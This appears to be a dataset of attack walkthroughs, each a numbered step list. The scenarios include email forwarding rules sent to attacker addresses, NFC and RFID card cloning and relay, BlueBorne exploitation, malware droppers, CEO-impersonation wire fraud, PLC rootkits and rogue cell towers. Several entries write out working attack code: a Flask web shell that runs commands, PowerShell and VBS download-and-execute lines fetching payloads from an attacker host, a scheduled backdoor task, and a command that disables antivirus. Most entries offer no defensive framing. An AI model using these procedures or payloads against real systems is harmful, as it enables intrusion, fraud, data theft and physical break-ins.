Step 1: Attacker sends the user a seemingly useful Outlook add-in (e.g., PDF tool).Step 2: User installs it manually.Step 3: Add-in runs under Outlook's permissions and uses scripting API to insert a rule.Step 4: Rule created: if email received from anyone, forward to attacker@xmail.io.Step 5: Add-in also hides rule from the visible list using obfuscation.Step 6: All emails silently forwarded while user sees nothing unusual.

Step 1: Attacker sends user a link to a helpful SaaS tool (e.g., calendar sync, document signer).Step 2: User grants OAuth access using Google or Microsoft SSO.Step 3: Attacker’s backend uses granted token to access mailbox via API.Step 4: Sends each new email to attacker via their own API.Step 5: Since it's done via OAuth, no rule is visible in UI.Step 6: Data exfiltration continues invisibly via background app.

Step 1: Attacker sends user a malicious Chrome extension disguised as a productivity tool.Step 2: User installs it.Step 3: Extension monitors for Outlook Web sessions.Step 4: When Outlook Web is open, it injects a hidden API call to set a rule: forward all incoming mail to attacker@spyhub.org.Step 5: Rule created silently without alerting user.

Step 1: Attacker sets up a free public phone charging kiosk. Step 2: Hidden NFC reader under pad reads tap-to-pay credentials from phones. Step 3: NFC data is relayed to attacker’s second phone. Step 4: Second phone emulates the NFC card at a payment terminal. Step 5: Attacker makes unauthorized purchases.

Step 1: Attacker sets up a laptop with Kali Linux and a Bluetooth dongle in scanning mode. Step 2: Use blueborne-scanner to detect all nearby Bluetooth-enabled devices. Step 3: For each vulnerable device, run the Metasploit BlueBorne exploit targeting their OS. Step 4: Exploit completes silently without notifying the target. Step 5: Attacker logs MAC addresses, OS types, and control access for reporting.

Step 1: Attacker sets up a laptop with an ACR122U NFC reader and installs NFCProxy or similar software. Step 2: Victim’s badge is read via the ACR122U reader while they sit at a coffee shop or while walking past attacker. Step 3: NFCProxy captures and logs the data and sends it live via a Wi-Fi tether to a second NFC emulator device. Step 4: The emulator is placed at the entrance of the secure building and replays the signal. Step 5: The door’s NFC reader accepts the token, and the attacker walks in. Step 6: The victim never loses their card or knows it was cloned.

Step 1: Attacker sets up a redirect chain that starts with a legit-looking site and ends at a malware host. Step 2: Email is composed using courier branding and fake tracking number. Step 3: Victim receives email stating "Your package is on the way!" with a "Track Now" button. Step 4: Victim clicks and is silently redirected through multiple sites until the final exploit loads. Step 5: Exploit delivers payload (e.g., credential stealer). Step 6: Victim sees a fake "delivery error" page while malware installs silently.

Step 1: Attacker sets up encrypted DNS tunnel server using dns2tcp. Step 2: Malware connects using the client side to attacker’s domain. Step 3: Malware and attacker exchange AES-encrypted messages through crafted DNS requests. Step 4: Attacker sends instructions like "disable firewall", "download file", etc. Step 5: Malware replies with status, all over DNS.

Step 1: Attacker shares a free “offline version” of browser game.Step 2: Victim installs EXE to play offline.Step 3: Game runs fine, but RAT installs silently.Step 4: RAT accesses clipboard, documents folder.Step 5: Attacker exfiltrates sensitive files.

Step 1: Attacker shares fake proctoring tool via exam email.Step 2: Victim installs tool expecting it to be official.Step 3: The tool grants camera and mic access.Step 4: Trojan operates in background sending all media to attacker.Step 5: System remains vulnerable even after exam.

Step 1: Attacker shops at a mall where customers scan NFC loyalty cards to earn reward points.Step 2: They ask to “borrow” a friend’s card to try it, then scan it using their phone’s NFC reader.Step 3: Saves tag data and writes it to multiple blank NFC stickers.Step 4: Uses these stickers at different stores to claim purchases, earn points, and redeem rewards.Step 5: The system believes all purchases come from the real cardholder.Step 6: The original user loses reward points or faces blacklisting when fraud is suspected.

Step 1: Attacker signs an email using their own S/MIME cert. Step 2: Sends it to victim’s email client (like Outlook). Step 3: Outlook auto-imports cert and marks sender as trusted. Step 4: Attacker later sends phishing email; client doesn’t warn.

Step 1: Attacker signs up for MaaS and customizes malware function (e.g., keylogger, stealer). Step 2: Each build auto-generates unique code using metamorphic engine. Step 3: Distributes to targets via links, email, or bundling. Step 4: Every victim gets a different binary. Step 5: Payload installs silently, reports data to attacker. Step 6: Mutation prevents signature sharing. Step 7: Attacker remains anonymous using darknet tools.

Step 1: Attacker signs up with a real ad network and creates a convincing-looking ad banner for a fake software update (e.g., “Update your Flash Player”).Step 2: The ad links to a malicious website hosted by the attacker that looks like Adobe Flash update page.Step 3: User browses a real website (which unknowingly shows the attacker’s ad).Step 4: User clicks on the ad and is redirected to the malicious website.Step 5: Website auto-downloads a fake “Flash Update” EXE file.Step 6: User installs the downloaded file, thinking it's legitimate.Step 7: The malware runs silently, creates persistence, and gives remote access to the attacker.

Step 1: Attacker simulates an exported “Password List” from a password manager as a CSV file.Step 2: Real CSV file is replaced with a keylogger executable renamed “passwords.csv.exe.”Step 3: File is zipped and encrypted with password “Passwords2025.”Step 4: Victim receives email saying: “Here’s the exported password file you requested.”Step 5: User unzips and opens the disguised file.Step 6: Keylogger installs and begins capturing login data.Step 7: Data is exfiltrated to attacker in real-time.

Step 1: Attacker spoofs CEO email (ceo.jane.smith@yourcomnpany.com).Step 2: Sends email to HR stating “urgent client event today, need 10x$200 Amazon cards.”Step 3: Requests cards be scratched and codes shared over email.Step 4: HR, believing it’s urgent and confidential, complies.Step 5: Attacker uses codes or sells them on the dark web.Step 6: CEO denies sending any such mail next day.

Step 1: Attacker spoofs CEO’s email domain and writes an urgent-sounding email to CFO.Step 2: Encrypted DOC file (payment instruction) is attached, password is in email (“Password: SecurePay”).Step 3: CFO opens the document and reads the fake vendor payment request.Step 4: CFO trusts the email and proceeds to wire the money.Step 5: Funds are transferred to attacker-controlled bank.

Step 1: Attacker spoofs executive identity using similar email (ceo.jack@yourcorp.co instead of .com).Step 2: Crafts convincing acquisition announcement and NDA attachment.Step 3: Sends internal email to CFO or financial controller.Step 4: Requests urgent payment to secure the deal.Step 5: Claims confidentiality to discourage verification.Step 6: Funds are wired to attacker-controlled bank with “M&A Fund” reference.Step 7: Fraud is detected only after media hears rumors and confirms no such deal.

Step 1: Attacker spoofs or hijacks the CEO’s email.Step 2: Sends message to CSR (Corporate Social Responsibility) officer.Step 3: Claims the CEO wants to donate quickly to a disaster relief campaign.Step 4: Includes fake charity website and tax receipt.Step 5: CSR, trying to impress leadership, processes payment.Step 6: Money is wired to attacker’s account masked under “nonprofit.”Step 7: Real CEO denies knowledge of the donation.

Step 1: Attacker spots someone tapping their subway card at an entry gate.Step 2: Uses Android phone with NFC to scan the card covertly in close proximity.Step 3: Saves the RFID dump using MIFARE Classic Tool.Step 4: Writes the data to a blank NFC card.Step 5: Tests cloned card at a subway gate; gains access without valid payment.Step 6: Uses it repeatedly for unauthorized free travel.

Step 1: Attacker stands close to victim in a crowded train.Step 2: Uses NFC reader app on phone to scan victim's card through clothing (NFC skimming).Step 3: Extracts basic payment details and stores them.Step 4: Transfers data onto another NFC-compatible card using a phone.Step 5: Attempts small-value transactions at unattended kiosks or vending machines.

Step 1: Attacker stands near gym turnstile and sees member tap RFID badge.Step 2: Uses concealed RFID scanner to capture tag ID when close.Step 3: Goes to locker room, writes the ID to a blank tag.Step 4: Enters gym at night using cloned tag.Step 5: Uses facilities without paying, or steals items from unattended lockers.

Step 1: Attacker steals admin credentials Step 2: Connects to another machine using PsExec Step 3: Runs PowerShell command remotely, injecting malware into memory Step 4: Gains full access to new system Step 5: Repeats across network

Step 1: Attacker takes a screenshot of a real login page (e.g., Microsoft 365).Step 2: Encodes this screenshot as a base64 PNG and embeds in HTML email.Step 3: Places transparent input fields using CSS position:absolute; over the username and password fields.Step 4: Scripts attached to these fields capture keystrokes and submit them to an attacker's URL.Step 5: The email is sent with a subject like “Session Timed Out – Log Back In”.Step 6: Victim enters login credentials thinking it’s legitimate.Step 7: Credentials are stolen and saved for later account takeover.

Step 1: Attacker targets admin panel pages that lack clickjacking protection. Step 2: Malicious page embeds the admin panel as an iframe with transparent overlays to trick clicks. Step 3: Admin user visits attacker’s page and unknowingly clicks hidden admin controls (e.g., deleting users). Step 4: Attacker gains control or disrupts operations through victim’s privileges. Step 5: Detection includes monitoring admin activity logs for unexpected actions. Step 6: Fix by enforcing strict X-Frame-Options headers and adding multi-factor confirmations on admin operations.

Step 1: Attacker tricks user into installing a Google Workspace Add-on (script).Step 2: The script is granted permission to read and forward Gmail messages.Step 3: Script runs periodically to check for emails with sensitive keywords (e.g., “password”, “invoice”).Step 4: Matched emails are copied and sent via GmailApp.sendEmail() to attacker’s address.Step 5: Script is scheduled to run invisibly in background every hour.

Step 1: Attacker uploads a PNG with embedded keylogger binary to Slack profile.Step 2: Victim interacts with attacker in a shared Slack channel.Step 3: A Slack bot or script scrapes profile image via API.Step 4: Bot decodes the image using Steghide with known password.Step 5: Keylogger is extracted and launched from memory.Step 6: Keys are logged and uploaded to Slack private channel.Step 7: Attacker silently monitors without ever sending a message.

Step 1: Attacker uploads a malicious .ZIP file to Dropbox, encrypting it with a password (e.g., “Client2025”).Step 2: File contains obfuscated malware or stealer.exe.Step 3: Attacker sends a phishing email with a message like “Here’s the contract you requested” and includes the link.Step 4: Victim clicks the link and downloads the encrypted archive.Step 5: Victim opens the archive using the provided password.Step 6: Victim double-clicks the executable, which installs malware.Step 7: System is compromised, data starts exfiltrating.

Step 1: Attacker uploads a modified game file (e.g., cheat mod) to a game forum.Step 2: Victim downloads and installs the file thinking it will improve gameplay.Step 3: Installation silently drops a RAT into the system.Step 4: RAT establishes a backdoor connection.Step 5: Attacker can spy, steal passwords, or install more malware.

Step 1: Attacker uploads an archive with specially crafted file names to a cloud service. Step 2: The archive contains malformed filenames that exploit preview service (e.g., filename overflows). Step 3: Sends an email with a link: “Shared Files: Team Reports – Click to Preview”. Step 4: Target opens the file in browser preview mode without downloading. Step 5: The preview system processes archive contents, triggering exploit and injecting remote shell.

Step 1: Attacker uploads fake eBook titled “Top Interview Questions” to forums.Step 2: Victim downloads PDF.Step 3: PDF contains embedded code that runs when opened with vulnerable reader.Step 4: Trojan installs silently.Step 5: Attacker gains remote access to documents and keystrokes.

Step 1: Attacker uploads infected Excel file to Drive.Step 2: Shares link saying “Project Budget File”.Step 3: Victim downloads, opens and enables macros.Step 4: Macro downloads RAT.Step 5: RAT provides attacker full access to internal files.

Step 1: Attacker uploads rotating payloads (e.g., tool1.exe, tool2.exe) to cloud bucket.Step 2: Ad includes JS logic that checks the date and selects corresponding payload.Step 3: User clicks “Download Cleaner Tool” and is served that day’s malware variant.Step 4: Malware is signed with changing hash to bypass AV.Step 5: File is executed; variant activates different functionality (e.g., keylogger today, RAT tomorrow).Step 6: C2 comms are encrypted and vary endpoints.Step 7: Logs exfiltrated via cloud API.

Step 1: Attacker uses HTTrack to clone a real LinkedIn profile viewer page. Step 2: Malicious JavaScript is added to the clone to exploit browser flaws. Step 3: Email is spoofed to look like it came from LinkedIn. Step 4: Victim clicks the "See Who Viewed You" link. Step 5: Malicious clone site loads and triggers JavaScript execution in browser. Step 6: Spyware installs and starts logging keystrokes.

Step 1: Attacker uses OTA SMS to send a “Request Information” STK command.Step 2: The victim’s phone displays a message like “Network issue detected. Please confirm your phone ID.”Step 3: User unknowingly enters their IMEI or confirms a prompt that allows it to be sent.Step 4: The SIM applet sends this back in a covert SMS to attacker’s receiver.Step 5: IMEI is used later in clone/pretexting attacks.

Step 1: Attacker uses RFID relay device to pick up signal from car key inside house.Step 2: Signal is captured and amplified.Step 3: Clones the immobilizer data to a new key fob.Step 4: Uses cloned fob to unlock and start car.Step 5: Drives off without alarm or key.

Step 1: Attacker uses [DB Encoder Tool] to create encrypted logic as raw values.Step 2: Uploads data block (e.g., DB55) with ciphered logic segments.Step 3: Adds interpreter code in OB1 to decode and map variables.Step 4: At runtime, variables become executable steps (e.g., disable alarm relay).Step 5: Uses [Custom Encryption Wrapper] to obfuscate data format.Step 6: PLC executes logic only when specific internal variable matches.Step 7: After 5 seconds, interpreter logic deletes mappings.Step 8: Reviewers see only scrambled DB values.

Step 1: Attacker uses [Snap7] to interface with Siemens S7 PLC over Ethernet.Step 2: Loads custom ladder logic payload from local file.Step 3: Uses Snap7 functions to stop PLC, upload OB1, and restart it.Step 4: Logic includes actuator control override during specific sensor input.Step 5: Script masks upload by spoofing valid metadata.Step 6: [Packet Crafter] used to inject upload from unmonitored port.Step 7: Engineering tools show no active programming session.Step 8: Rootkit remains until manually removed via offline tool.

Step 1: Attacker uses a Zigbee sniffer like RZUSBstick connected to a PC. Step 2: The attacker runs KillerBee’s zbdump to monitor Zigbee traffic on the common Zigbee channels (11–26). Step 3: A new device (smart bulb) is added to the Zigbee network by the legitimate user. Step 4: During the joining process, the key exchange is sent in plaintext if encryption is not enforced. Step 5: Attacker captures this packet and extracts the Network Key using zbkeys. Step 6: This key allows the attacker to decrypt further Zigbee traffic or inject malicious commands.

Step 1: Attacker uses a Zigbee sniffer to monitor OTA updates on the network. Step 2: Waits for a firmware upgrade event (either automatic or triggered). Step 3: Captures firmware packets being sent to the Zigbee device. Step 4: Analyzes the firmware binary using a hex editor or reverse engineering tool. Step 5: Extracts hardcoded keys or signs of insecure cryptographic material. Step 6: Uses this key to decrypt traffic or impersonate legitimate devices.

Step 1: Attacker uses a software-defined radio like HackRF and tunes into Zigbee channel 15–20. Step 2: Sends out Touchlink Scan Requests to nearby devices. Step 3: If a device supports Touchlink and is in commissioning mode, it responds with identifying info. Step 4: Attacker forces the commissioning to happen insecurely, capturing the network key exchange. Step 5: The key, sent over-the-air in some legacy or insecure configurations, is extracted from packet logs. Step 6: With the key, the attacker joins the network silently and manipulates devices.

Step 1: Attacker uses an NFC reader phone and places it close to a commuter's bag or wallet. Step 2: Data from the NFC transport card is read silently. Step 3: Phone relays this data via Wi-Fi to a second device at a station gate. Step 4: Second device emulates the card and taps on the NFC gate. Step 5: Gate opens, thinking the real card is present.

Step 1: Attacker uses an NFC reader to skim a hotel keycard from victim’s pocket. Step 2: Keycard data is relayed to a second device or card writer. Step 3: Clone card is written with same credentials. Step 4: Attacker uses the cloned card to open victim’s hotel room. Step 5: No alert is triggered due to identical credentials.

Step 1: Attacker uses hcitool to observe active BLE beacon traffic used for tracking pallets/equipment. Step 2: Clones multiple BLE beacons using ESP32 and assigns them spoofed asset IDs with spoofed UUIDs. Step 3: Deploys these fake beacons near different zones in the warehouse. Step 4: Central BLE tracking system logs the spoofed IDs and updates database thinking those assets moved. Step 5: Inventory appears scattered or misplaced, leading to operational confusion. Step 6: May be used as a cover for actual asset theft or smuggling.

Step 1: Attacker uses phone with NFC and MRZ data (from passport visible page).Step 2: Approaches tourist at airport and starts reading passport chip.Step 3: Extracts RFID data from passport using open-source tools.Step 4: Stores identity data and clones to RFID emulator.Step 5: Uses fake RFID ID for ID fraud or PII theft.

Step 1: Attacker uses previously obtained credentials to log into the victim’s email via Gmail mobile app.Step 2: Goes to Settings > Account > Forwarding/POP/IMAP.Step 3: Adds a new forwarding address such as attacker@maildrop.cc.Step 4: Confirms via verification email (already accessible via compromised account).Step 5: Enables "Forward a copy of incoming mail" silently.Step 6: Logs out; the victim receives all emails as normal, while copies go to attacker’s inbox.

Step 1: Attacker uses stolen credentials to configure the victim’s account in Thunderbird (an older IMAP-based email client).Step 2: Sets a local message filter: “For all incoming emails, forward to attacker@evilmail.org”.Step 3: Thunderbird pushes changes to the IMAP server, and due to legacy sync, it starts forwarding emails.Step 4: User continues using official client (e.g., Outlook) without noticing any change.Step 5: Emails are forwarded from the client level, bypassing server-level policy enforcement.

Step 1: Attacker visits a shared office and observes someone tapping RFID tag.Step 2: Walks behind them and discreetly scans the tag with handheld reader.Step 3: Goes to nearby area, writes the tag data to a blank tag.Step 4: Uses cloned tag to access premium zones like server rooms or meeting halls.Step 5: Uses physical access to steal data or tamper with devices.

Step 1: Attacker visits pet adoption center and scans RFID chip of a pet using a concealed reader.Step 2: Copies unique chip ID onto a blank pet tag.Step 3: Affixes tag to another animal or uses it to falsely claim ownership.Step 4: Uses cloned ID to file vet claim or register pet as their own.Step 5: Could exploit microchip-based pet door access.

Step 1: Attacker visits public area with NFC-enabled poster (e.g., concert or train ad).Step 2: Reads original NFC tag containing URL.Step 3: Clones tag to new blank tag but alters link to phishing site.Step 4: Replaces original NFC tag on poster with malicious one.Step 5: Visitors who tap poster are redirected to attacker’s phishing site.

Step 1: Attacker waits for a Green Power device to join the Zigbee network. Step 2: Captures commissioning frames using zbdump or Ubiqua. Step 3: If security level is low (common in legacy devices), commissioning key is sent unencrypted. Step 4: Extracts the key from the payload using Zigbee specs. Step 5: Uses it to impersonate the GP device or inject spoofed energy-saving data.

Step 1: Attacker waits until system is left idle, unlocked (e.g., coffee shop scenario).Step 2: From a few meters away, run scan.py to detect active USB receivers.Step 3: Inject key combo Win + R to open Run dialog.Step 4: Type PowerShell command to disable antivirus and firewall (Set-MpPreference -DisableRealtimeMonitoring $true).Step 5: Download and run malware from attacker-controlled server.Step 6: Exit silently.

Step 1: Attacker walks near a parked vehicle with Android Auto active and Bluetooth discoverable. Step 2: Runs blueborne-scanner to fingerprint the infotainment system's OS. Step 3: Attacker loads the BlueBorne Metasploit module configured for Android OS. Step 4: Sends exploit packets to the target, gaining shell access to the infotainment system. Step 5: Opens music player remotely or activates voice commands, simulating unauthorized in-car control.

Step 1: Attacker wears NFC-enabled smartwatch with hidden NFC relay code. Step 2: While near the victim, attacker’s phone connects via Wi-Fi Direct to the watch. Step 3: Watch reads payment token from victim's unlocked phone or nearby NFC tag. Step 4: Relay code sends token to attacker's phone, which forwards it to a terminal. Step 5: POS completes transaction using the relayed token.

Step 1: Attacker wears smart glasses with NFC reader hidden in frame. Step 2: Walks past employee and captures their NFC badge info. Step 3: Glasses send NFC data via Wi-Fi to a phone/emulator at secure door. Step 4: Emulator sends signal to door lock. Step 5: Door unlocks remotely, granting unauthorized access.

Step 1: Attacker writes a Flask server:python
@app.route("/login")
def login():
cmd = request.args.get("cmd")
if cmd: return subprocess.getoutput(cmd)
return "Login page"
Step 2: Deploys it on victim’s machine under port 5000 as a service.Step 3: From attacker browser: http://victim-ip:5000/login?cmd=whoami executes and shows result.Step 4: Service is disguised as a fake login page.Step 5: Attack persists until service is stopped.

Step 1: Attacker writes a JavaScript dropper to download spyware.Step 2: Code is obfuscated using multiple tools (Base64, JSFuck, unicode escapes).Step 3: HTML file (Memo.html) contains a trigger that reconstructs .js payload.Step 4: Victim opens HTML; script executes and reconstructs install.js.Step 5: File is saved to disk and silently executed via WScript.Step 6: Spyware runs in background, collecting sensitive info.Step 7: Data is exfiltrated via hidden browser tabs.

Step 1: Attacker writes a JavaScript file (update.js) that silently downloads malware from a remote server.Step 2: File is renamed to look like a document (e.g., “update.doc.js”) and placed in a ZIP archive.Step 3: ZIP file is password-protected using “Update2025”.Step 4: Email impersonates the finance department and says: “Please review the attached financial update script.”Step 5: Victim opens ZIP and sees the “.doc.js” file with an icon resembling a Word document.Step 6: Victim double-clicks, unknowingly running the script.Step 7: Script connects to attacker’s server, downloads malware, and infects the system.

Step 1: Attacker writes a JavaScript payload that opens a remote malicious site silently in the background.Step 2: The script is obfuscated (e.g., using tools like Obfuscator.io).Step 3: It is base64 encoded and added inside a fake image tag in HTML.Step 4: Email sent with subject like "View New HR Policy Document".Step 5: Victim opens the email, image loads silently.Step 6: The script executes inside the email client browser view, redirecting the victim to a phishing or malware-hosting site.Step 7: Further infection or data harvesting can occur from that site.

Step 1: Attacker writes a PowerShell one-liner that downloads and executes spyware.Step 2: Encodes the command and places it in a clipboard copy operation in JavaScript.Step 3: HTML file (IT_Form.html) says “Paste this into PowerShell to verify system info.”Step 4: When opened, the clipboard is auto-filled with the malicious command.Step 5: Victim, misled by text, pastes the content into PowerShell terminal.Step 6: Command runs, downloads and installs spyware silently.Step 7: Attacker gains full access to system.

Step 1: Attacker writes a PowerShell script to start a listener:Start-Listener.ps1: Start-Job { Invoke-WebRequest -Uri http://attacker-ip:8080 -OutFile C:\Temp\shell.ps1; Invoke-Expression (Get-Content C:\Temp\shell.ps1) }.Step 2: Places this script in C:\Temp on victim system.Step 3: Creates a scheduled task: schtasks /create /tn "PS_Backdoor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\Start-Listener.ps1" /sc minute /mo 5.Step 4: Every 5 mins, victim system pulls and runs backdoor code from attacker server.Step 5: Attacker modifies remote payload without needing re-access.

Step 1: Attacker writes a Python script that fetches a file from GitHub:exec(requests.get("https://raw.githubusercontent.com/user/backdoor/main/payload.py").text)Step 2: Places this script as a startup task or cronjob on victim machine.Step 3: Attacker can update payload.py at any time; victim executes latest version on next boot or interval.Step 4: Attacker adds reverse shell, keylogger, or malware to payload.py as needed.Step 5: Backdoor updates silently without re-infecting system.

Step 1: Attacker writes a bash script named “server_cleaner.sh” that opens a reverse shell.Step 2: Places script into a password-protected .zip file (“Cleaner2025”).Step 3: Sends email to sysadmin claiming urgent cleanup task is pending.Step 4: Victim downloads and unzips using password.Step 5: Executes shell script, believing it’s legitimate.Step 6: Shell connects back to attacker.Step 7: Attacker has remote control of system.

Step 1: Attacker writes a fake job offer or invoice and attaches a Word file with macros.Step 2: Victim opens the email and downloads the Word document.Step 3: Document asks victim to “Enable Content” to view full details.Step 4: When content is enabled, a hidden script installs the RAT.Step 5: Attacker gains remote access and can record keystrokes or steal files.

Step 1: Attacker writes a job-themed email and embeds an offer.html file.Step 2: The HTML file contains obfuscated JavaScript that, when opened, constructs a .vbs dropper file.Step 3: User clicks and opens the attachment in Chrome.Step 4: JavaScript executes and saves a dropper.vbs file in %TEMP% folder.Step 5: Script silently executes using ActiveX objects, downloads second-stage payload (e.g., backdoor.exe) from attacker server.Step 6: Attacker gains persistent backdoor access to victim's machine.

Step 1: Attacker writes a multipart email with two MIME sections — one benign and signed, the other unsigned but malicious. Step 2: Signs only the benign section (e.g., “Hello, here’s the report”). Step 3: Adds the second section with hidden malicious text or scripts. Step 4: Structures MIME headers so that some clients only show the unsigned section. Step 5: Sends the email to targets using Thunderbird. Step 6: On the victim's email client, the displayed content is from the unsigned part, but it appears as a signed email.

Step 1: Attacker writes a small keylogger script in JavaScript.Step 2: Script is obfuscated and encoded in base64 format.Step 3: Payload is embedded in a fake image file (e.g., data:image/png;base64,...) in the email.Step 4: The email is sent to target users with a catchy subject like “Invoice Attached”.Step 5: Victim opens the email; the keylogger runs silently in the background.Step 6: Keystrokes are captured and exfiltrated to the attacker’s server.
Step 1: Attacker writes a small malicious JavaScript payload like alert('Session stolen') or one that sends cookies to an external server Step 2: Embeds the JS inside an SVG tag as

Step 1: Attacker writes an HTML email with JavaScript exploiting a new browser engine flaw. Step 2: Email is sent disguised as a newsletter with styled content and images. Step 3: Email client renders HTML automatically, executing embedded script. Step 4: The exploit script bypasses browser sandboxing and executes malicious code. Step 5: Attacker gains access to stored credentials or installs malware.

Step 1: Attacker writes an HTML file with an embedded SVG image.Step 2: JavaScript is hidden in the <script> tag inside the SVG.Step 3: When user opens the HTML file, script executes, reconstructs a .ps1 script and saves it locally.Step 4: PowerShell script auto-executes using mshta.exe.Step 5: Script installs spyware that monitors browser activity and sends it to attacker's server.Step 6: The entire action occurs without visible signs to the user.

Step 1: Attacker writes an STK applet to intercept incoming SMS.Step 2: When victim receives a text (e.g., OTP or sensitive info), SIM reads it.Step 3: Applet uses SMS or data channel to forward contents to attacker’s server.Step 4: This is done in background, victim sees nothing.Step 5: OTPs or codes meant for victim are stolen and abused.

Step 1: Attacker writes backdoor.vbs:Set oShell = CreateObject("WScript.Shell")oShell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')", 0, FalseStep 2: Saves it in C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.Step 3: On next boot, PowerShell payload fetches reverse shell from attacker’s site.Step 4: Attacker gets access with Netcat or Metasploit handler.Step 5: Script remains hidden due to VBS stealth.

Step 1: Attacker writes conditional logic in OB1 to check if Date = 29/02 using [RTC Comparator].Step 2: If true, disables trip interlocks and motor delay timer.Step 3: Logic executes only on that day and reverts itself afterward.Step 4: During test periods or audits, date check fails — logic hidden.Step 5: Uses [PLCsim] to simulate the Feb 29 condition for verification.Step 6: Operator assumes any fault is coincidental due to date rarity.Step 7: Logs misreport the date as March 1.Step 8: Reintroduction of rootkit logic required only every 4 years.

Step 1: Attacker writes malicious VBA code and saves it in a .docm file Step 2: A macro function triggers malware download when run Step 3: Attacker embeds a Base64 image in the email HTML with an tag that uses a hyperlink-like interaction Step 4: Victim previews the document in Outlook or clicks “Open Preview” Step 5: Base64 image loads silently, triggering the macro via Office Preview vulnerabilities Step 6: Macro downloads malware and executes silently

Step 1: Attacker writes malware that regularly checks a DNS TXT record like trigger.command.attacker.com. Step 2: The malware remains idle until the response contains a keyword like ACTIVATE123. Step 3: When the keyword appears, malware starts exfiltration or payload execution. Step 4: Attacker changes DNS TXT value to trigger behavior remotely. Step 5: Malware uses DNS to avoid using suspicious HTTP/S or TCP channels.

Step 1: Attacker writes script that reads USB serial number (e.g., 1234-5678) upon plug-in using [USB Serial Reader].Step 2: Embeds this script into [WinCC] runtime logic using [HMI Logic Editor].Step 3: If detected USB ID matches, HMI sends flag to PLC (via SCADA tag) that triggers rootkit logic.Step 4: Logic disables fail-safe mode or overrides alarm thresholds.Step 5: When USB removed, PLC returns to normal.Step 6: Attack is executed only during engineer interaction window.Step 7: Logs spoofed to show no tag change.Step 8: Attack relies on familiarity and trust in engineer’s USB device.

Step 1: Attacker zips JavaScript malware inside eBook folder. Step 2: Email says “Download your free eBook!” Step 3: Victim extracts ZIP and opens JS file. Step 4: Malware downloads and installs silently. Step 5: Victim unknowingly infected.

Step 1: Attacker zips a fake PO with an executable inside. Step 2: Sends it from spoofed supplier email. Step 3: Victim extracts ZIP and runs the file. Step 4: Malware installs and gives access to attacker. Step 5: Company data is compromised.

Step 1: Attacker’s phone gets close to car owner in a public place. Step 2: NFC key data is captured and sent to a second phone near car. Step 3: Second phone sends relayed NFC signal to car’s reader. Step 4: Car unlocks and starts without real key nearby. Step 5: Vehicle theft or manipulation occurs.

Step 1: Boot a Raspberry Pi with Kali Linux and enable monitor mode. Step 2: Generate 1000 SSIDs using a Python script. Step 3: Use mdk4 wlan0 b -f ssids.txt to broadcast them. Step 4: Observe smart bulbs, cameras, and speakers blinking or going offline. Step 5: Log system messages and connection retries on the IoT hub.

Step 1: Borrow a cabinet key temporarily when no one is watching. Step 2: Press it into soft wax or clay to make a mold. Step 3: Return key in original place. Step 4: Use mold at a key duplication shop. Step 5: Use duplicate key after hours to access documents.

Step 1: Break open USB flash and remove controller chip.Step 2: Use NAND reader to dump firmware.Step 3: Analyze firmware for hidden partitions, malware.Step 4: Optionally inject new boot sector with payload.Step 5: Reassemble USB and test.Step 6: Use USB as covert tool.

Step 1: Bring a small Raspberry Pi in a pocket or bag. Step 2: Access a less monitored network cabinet (under desk, meeting room). Step 3: Connect it to a switch port and power. Step 4: Let it capture internal traffic like credentials or session info. Step 5: Retrieve it after a few days.
Step 1: Brings small 4G router. Step 2: Plugs into network switch in unattended area. Step 3: Routes internal traffic via mobile network. Step 4: Attacker connects via LTE.
Step 1: Brings tools during regular hours. Step 2: Stores them inside office cabinet or locker. Step 3: Uses them during night shift to carry out spying. Step 4: Returns them or hides again.

Step 1: Broadcast LTE signal using SrsRAN.Step 2: Accept RRC Connection Request.Step 3: Send RRC Connection Reject with no redirection indication.Step 4: Device assumes network error and follows implicit fallback to 2G.Step 5: Operate rogue 2G BTS and accept victim.Step 6: Record IMSI and extract call logs.Step 7: Replay to analyze device behavior.

Step 1: Browses company Git repo and finds file config.js or .env with lines:API_KEY = "prod-abc123"Step 2: Copies key into Postman.Step 3: Sends request to internal API:GET https://internalapi.company.com/users?key=prod-abc123Step 4: Gets user data or sensitive financial records.Step 5: Saves or shares the data outside.

Step 1: Build a Discord bot that shares files on command.Step 2: Upload “MiniGame.exe” with keylogger inside.Step 3: Send bot to invite links and share file.Step 4: User runs the file.Step 5: Keylogger runs in background.

Step 1: Build a Word add-in using Office JS APIs.Step 2: Add button named “Format All” that runs file renamer via API.Step 3: Sideload into Word on test VM.Step 4: Open Word and install the add-in.Step 5: Click button, script encrypts text in open document + others in folder.Step 6: Shows ransom in pane or text box.

Step 1: Build a basic Chrome extension with manifest.json.Step 2: Add background script that triggers a ransomware simulation (file renamer using JavaScript APIs via local node bridge).Step 3: Name it "FocusBooster".Step 4: Load into Chrome on test VM.Step 5: On activation, script renames files in Downloads.Step 6: Shows Chrome alert as ransom demand.

Step 1: Build a bot that uses microphone input to detect specific commands.Step 2: Distribute bot disguised as accessibility app.Step 3: Hacker sends commands via phone call or media ad (e.g., “Run backup!”).Step 4: Bot decodes and runs based on voice.Step 5: Sends status via email.

Step 1: Build a fake Android app using Android Studio.Step 2: Embed a Telegram bot in the background using Java or Python.Step 3: Host the APK on a fake website or share via Bluetooth.Step 4: Once installed, the app listens for Telegram commands (e.g., take photo, GPS, SMS).Step 5: Control phones via Telegram.

Step 1: Build a fake HDMI-to-USB adapter with sniffer chip. Step 2: Replace real cable. Step 3: When user uses screen, frames or logs are captured. Step 4: Logs stored on internal memory or sent via BLE.

Step 1: Build a simple SMS listener app in MIT App Inventor or Android Studio.Step 2: In code, add permission to READ_SMS and RECEIVE_SMS.Step 3: Write code to capture incoming SMS and forward to a predefined number or email.Step 4: Sign and install the app on test device (after enabling unknown sources).Step 5: Send SMS to the device and observe if it is forwarded silently.Step 6: Log the SMS data on a server or email inbox for attacker observation.Step 7: Use NetCapture or PCAPdroid on device to confirm exfiltration path.

Step 1: Build an Android app with a hidden WebView component.Step 2: Load a URL (hosted via Ngrok) that contains XSS, phishing form, or crypto miner.Step 3: On device, install and open app (UI appears blank).Step 4: In background, WebView loads malicious page and executes JavaScript.Step 5: On server, log browser fingerprint, device data, and location via JS.Step 6: Check Android logs for silent activity.Step 7: Block WebView via firewall and observe behavior change.Step 8: Simulate same with mobile browser to compare visibility.

